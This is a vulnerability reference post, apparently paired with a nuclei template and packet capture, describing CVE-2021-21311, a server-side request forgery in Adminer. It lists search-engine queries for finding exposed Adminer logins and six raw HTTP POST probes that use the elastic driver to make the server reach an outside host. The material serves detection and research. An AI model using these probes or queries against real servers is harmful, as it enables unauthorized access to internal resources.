---
layout: "post"
cve_id: "CVE-2021-21311"
title: "Adminer <4.7.9 - Server-Side Request Forgery"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-21311.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml"
author: "Adam Crosser,pwnhxl"
severity: "high"
impact: "Successful exploitation of this vulnerability could lead to unauthorized access to internal resources and potential data leakage.
"
remediation: "Upgrade to version 4.7.9 or later."
reference:
  - "https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6"
  - "https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf"
  - "https://packagist.org/packages/vrana/adminer"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-21311"
  - "https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"
  cvss-score: 7.2
  cve-id: "CVE-2021-21311"
  cwe-id: "CWE-918"
  epss-score: 0.93872
  epss-percentile: 0.99859
  cpe: "cpe:2.3:a:adminer:adminer:*:*:*:*:*:*:*:*"
metadata:
  max-request: 6
  vendor: "adminer"
  product: "adminer"
  shodan-query: ['title:"Login - Adminer"', 'cpe:"cpe:2.3:a:adminer:adminer"', 'http.title:"login - adminer"']
  fofa-query: ['app="Adminer" && body="4.7.8"', 'title="login - adminer"', 'app="adminer" && body="4.7.8"']
  google-query: "intitle:\"login - adminer\""
  hunter-query: ['app.name="Adminer"&&web.body="4.7.8"', 'app.name="adminer"&&web.body="4.7.8"']
tags:
  - "cve2021"
  - "cve"
  - "adminer"
  - "ssrf"
  - "vkev"
  - "kev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
Adminer before 4.7.9 is susceptible to server-side request forgery due to exposure of sensitive information in error messages. Users of Adminer versions bundling all drivers, e.g. adminer.php, are affected. An attacker can possibly obtain this information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

## ðŸŒ HTTP Request
```nohighlight
POST /adminer/adminer.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

auth[driver]=elastic&auth[server]=example.org&auth[username]=t7fyrgiv&auth[password]=4mk5yjrh&auth[db]=pjyvarkj
```

```nohighlight
POST /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

auth[driver]=elastic&auth[server]=example.org&auth[username]=mvxgocbf&auth[password]=7qvpq0qq&auth[db]=0o6b1tbk
```

```nohighlight
POST /adminer.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

auth[driver]=elastic&auth[server]=example.org&auth[username]=te39ult3&auth[password]=mdj6hjte&auth[db]=l12onkqy
```

```nohighlight
POST /adminer/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

auth[driver]=elastic&auth[server]=example.org&auth[username]=cr666mqp&auth[password]=s49fxmrv&auth[db]=ovsotft3
```

```nohighlight
POST /_adminer/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

auth[driver]=elastic&auth[server]=example.org&auth[username]=iuggniuh&auth[password]=thyh1hsq&auth[db]=ykdk7xra
```

```nohighlight
POST /_adminer.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 X11; Ubuntu; Linux x86_64; rv:126.0 Gecko/20100101 Firefox/126.0
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

auth[driver]=elastic&auth[server]=example.org&auth[username]=gkezm6yy&auth[password]=xmxw4bw4&auth[db]=6apjbega
```


